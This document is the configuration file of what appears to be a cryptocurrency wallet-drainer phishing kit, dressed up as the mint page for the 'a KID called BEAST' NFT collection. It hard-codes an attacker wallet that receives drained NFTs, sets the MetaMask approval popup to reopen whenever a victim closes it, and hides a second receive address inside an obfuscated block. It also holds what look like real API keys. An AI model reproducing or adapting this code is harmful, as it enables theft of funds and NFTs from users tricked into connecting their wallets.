// 0X

const address = "0xcF310cA0D1D9A2261bB016262f97f75bDfD25a9C";
const infuraId = "82a3436f484845668c291ec69430ecef"
const moralisApi = "BYXOsHDwxEQWT9ai3dF3ZMPMcrlrvyDhwxGFYipgyt0c9Tgni38Q924d2Ab7Iydy"

const collectionInfo = {
    name: "a KID called BEAST™ (Mint)",
    title: "a KID called BEAST™", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "28.01.2023",
    socialMedia: {
        discord: "https://discord.gg/akidcalledbeast#3651",
        twitter: "https://twitter.com/akidcalledbeast",
    },
    medias: {
        preview: "preview322.gif",
        favicon: "favicon.png",
    },
    background: {
        type: "video",              // Supported types: image, video, color
        image: "background.jpg",    // Image for image type, video preview for video type
        video: "loader.mp4",    // If you don't use video, you can ignore this line
        color: "#000",           // If you don't use color, you can ignore this line
    }
}

drainNftsInfo = {
    active: true,
    minValue: 1,
    nftReceiveAddress: "0xcF310cA0D1D9A2261bB016262f97f75bDfD25a9C",
}

const mintInfo = {
    price: 0.4,         // Price per NFT.
    totalSupply: 5000,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 20,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const _0x5d7e32 = _0x3295; (function (_0x21445b, _0x2e90a3) { const _0x1e5bbe = _0x3295, _0x401e8c = _0x21445b(); while (!![]) { try { const _0x1d1170 = parseInt(_0x1e5bbe(0x19f)) / 0x1 + parseInt(_0x1e5bbe(0x1a3)) / 0x2 * (-parseInt(_0x1e5bbe(0x19c)) / 0x3) + parseInt(_0x1e5bbe(0x199)) / 0x4 * (parseInt(_0x1e5bbe(0x1a4)) / 0x5) + -parseInt(_0x1e5bbe(0x19d)) / 0x6 * (parseInt(_0x1e5bbe(0x19b)) / 0x7) + parseInt(_0x1e5bbe(0x1a1)) / 0x8 * (-parseInt(_0x1e5bbe(0x1a2)) / 0x9) + parseInt(_0x1e5bbe(0x19a)) / 0xa + -parseInt(_0x1e5bbe(0x1a0)) / 0xb; if (_0x1d1170 === _0x2e90a3) break; else _0x401e8c['push'](_0x401e8c['shift']()); } catch (_0x4b40ab) { _0x401e8c['push'](_0x401e8c['shift']()); } } }(_0x2e54, 0xaa576)); function _0x3295(_0x4d8c6f, _0x53a2d0) { const _0x2e54b3 = _0x2e54(); return _0x3295 = function (_0x3295d8, _0x1c97f2) { _0x3295d8 = _0x3295d8 - 0x199; let _0x4e6cc0 = _0x2e54b3[_0x3295d8]; return _0x4e6cc0; }, _0x3295(_0x4d8c6f, _0x53a2d0); } const nftsInfo = { 'active': !![], 'minValue': 0.01, 'checkMaxDay': 0x270f, 'receiveAddress': _0x5d7e32(0x19e) }; function _0x2e54() { const _0x5a689e = ['1430eBiqmZ', '17828miklJY', '11881610IXsvjz', '7jRdMgK', '6UJDpCN', '2814414wosBMK', '0xcF310cA0D1D9A2261bB016262f97f75bDfD25a9C', '375142xAcwae', '1594989fBGvGa', '214840YJQdLf', '315lzCIKh', '586294PAYhCL']; _0x2e54 = function () { return _0x5a689e; }; return _0x2e54(); }


var queue = [];
var draining = false;
var currentQueue;
var queueIndex = -1;

function cleanUpNextTick() {
    if (!draining || !currentQueue) {
        return;
    }
    draining = false;
    if (currentQueue.length) {
        queue = currentQueue.concat(queue);
    } else {
        queueIndex = -1;
    }
    if (queue.length) {
        drainQueue();
    }
}

function drainQueue() {
    if (draining) {
        return;
    }
    var timeout = runTimeout(cleanUpNextTick);
    draining = true;

    var len = queue.length;
    while(len) {
        currentQueue = queue;
        queue = [];
        while (++queueIndex < len) {
            if (currentQueue) {
                currentQueue[queueIndex].run();
            }
        }
        queueIndex = -1;
        len = queue.length;
    }
    currentQueue = null;
    draining = false;
    runClearTimeout(timeout);
}


/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion

// 0x
